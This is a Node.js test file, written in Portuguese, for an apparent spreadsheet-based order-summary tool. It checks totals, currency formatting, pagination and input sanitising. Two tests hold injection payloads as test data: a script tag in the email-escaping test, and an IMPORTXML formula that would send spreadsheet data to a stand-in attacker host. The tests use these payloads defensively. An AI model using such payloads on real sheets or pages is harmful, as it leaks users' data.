const test = require('node:test');
const assert = require('node:assert/strict');
const { carregar } = require('./simulador');

const pedido = (id, status, valor, criado_em) =>
  ({ id, cliente: 'Cliente ' + id, descricao: 'Pedido ' + id, valor, status, criado_em, atualizado_em: criado_em });

const HOJE = new Date(2026, 10, 15, 10, 0, 0); // 15/11/2026 10h

test('faturamento soma só pago e entregue criados no mês', () => {
  const { gs } = carregar();
  const resumo = gs.calcularResumo([
    pedido(1, 'pago', 1800, '2026-11-03 09:00:00'),
    pedido(2, 'entregue', 4200, '2026-11-14 18:30:00'),
    pedido(3, 'pendente', 3100, '2026-11-10 08:00:00'),
    pedido(4, 'cancelado', 900, '2026-11-05 12:00:00'),
    pedido(5, 'pago', 700, '2026-10-31 23:59:59'), // mês passado
  ], HOJE);

  assert.equal(resumo.faturamento, 6000);
  assert.equal(resumo.mes, 'novembro de 2026');
  assert.deepEqual({ ...resumo.porStatus.pendente }, { quantidade: 1, valor: 3100 });
  assert.deepEqual({ ...resumo.porStatus.cancelado }, { quantidade: 1, valor: 900 });
  assert.equal(resumo.porStatus.pago.quantidade, 1);
});

test('o primeiro segundo do mês já conta', () => {
  const { gs } = carregar();
  const resumo = gs.calcularResumo([pedido(1, 'pago', 10, '2026-11-01 00:00:00')], HOJE);
  assert.equal(resumo.faturamento, 10);
});

test('centavos somam sem erro de ponto flutuante', () => {
  const { gs } = carregar();
  const resumo = gs.calcularResumo([
    pedido(1, 'pago', 0.1, '2026-11-02 10:00:00'),
    pedido(2, 'pago', 0.2, '2026-11-02 10:00:00'),
  ], HOJE);
  assert.equal(resumo.faturamento, 0.3);
});

test('dinheiro no formato brasileiro', () => {
  const { gs } = carregar();
  assert.equal(gs.dinheiro(6800), 'R$ 6.800,00');
  assert.equal(gs.dinheiro(1234567.5), 'R$ 1.234.567,50');
  assert.equal(gs.dinheiro(0), 'R$ 0,00');
});

test('e-mail escapa o que o usuário digitou', () => {
  const { gs } = carregar();
  const resumo = gs.calcularResumo([], HOJE);
  const p = pedido(9, 'pendente', 50, '2026-11-01 10:00:00');
  p.cliente = '<script>alert(1)</script>';
  resumo.atencao = [{ pedido: p, alerta: gs.avaliarPedido(p, HOJE) }];
  const html = gs.montarEmail(resumo, 'https://exemplo');
  assert.ok(!html.includes('<script>'));
  assert.ok(html.includes('&lt;script&gt;'));
});

test('modo demonstração preenche as duas abas sem erro de tamanho', () => {
  const { gs, planilha } = carregar();
  const resumo = gs.sincronizar();
  const pedidos = planilha.abas.Pedidos;
  assert.equal(pedidos.valor(1, 1), '#');
  assert.equal(pedidos.valor(9, 1), 8); // 8 pedidos de exemplo
  assert.equal(planilha.abas.Resumo.valor(2, 2), resumo.faturamento);
  assert.match(planilha.abas.Resumo.valor(13, 2), /dados de exemplo/);
});

test('busca todas as páginas quando há mais de 10 pedidos', () => {
  const todos = Array.from({ length: 23 }, (_, i) => pedido(i + 1, 'pago', 100, '2026-11-02 10:00:00'));
  const chamadas = [];
  const resposta = (url) => {
    chamadas.push(url);
    const pagina = Number(new URL(url).searchParams.get('pagina'));
    const corpo = { pedidos: todos.slice((pagina - 1) * 10, pagina * 10), pagina, total: todos.length };
    return { getResponseCode: () => 200, getContentText: () => JSON.stringify(corpo) };
  };
  const { gs } = carregar({ urlFetch: { fetch: resposta, fetchAll: (lista) => lista.map((p) => resposta(p.url)) } });

  const pedidos = gs.buscarPedidos({ url: 'https://balcao.exemplo', token: 'x' });
  assert.equal(pedidos.length, 23);
  assert.equal(chamadas.length, 3);
  assert.deepEqual(Array.from(pedidos, (p) => p.id), todos.map((p) => p.id));
});

test('token errado vira mensagem clara', () => {
  const recusa = () => ({ getResponseCode: () => 401, getContentText: () => '{"erro":"Token inválido."}' });
  const { gs } = carregar({ urlFetch: { fetch: recusa, fetchAll: (l) => l.map(recusa) } });
  assert.throws(() => gs.buscarPedidos({ url: 'https://balcao.exemplo', token: 'errado' }), /recusou o token/);
});

test('texto que parece fórmula entra na planilha como texto', () => {
  const { gs } = carregar();
  const p = pedido(1, 'pendente', 10, '2026-11-14 10:00:00');
  p.cliente = '=IMPORTXML("https://ataque.exemplo/?"&A1,"//a")';
  p.descricao = '+55 11 90000-0001';
  const [linha] = gs.montarLinhas([p], HOJE);
  assert.equal(linha[1], "'" + p.cliente);
  assert.equal(linha[2], "'" + p.descricao);
  assert.equal(gs.textoSeguro('Padaria'), 'Padaria');
});
